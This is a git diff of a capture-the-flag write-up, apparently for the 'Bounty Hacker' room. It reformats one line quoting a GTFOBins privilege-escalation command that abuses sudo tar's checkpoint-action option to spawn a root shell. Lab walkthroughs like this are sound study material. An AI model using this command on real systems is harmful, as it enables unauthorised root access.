@@ -79,7 +79,8 @@ we got the first flag here 🚩!
 ![Example](https://github.com/y4ssr/Bounty-Hacker/blob/main/images/gtfobins.png?raw=true )
 
 *It says that we can priv esc using this command:
-*$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ![Example](https://github.com/y4ssr/Bounty-Hacker/blob/main/images/final.png?raw=true )
 
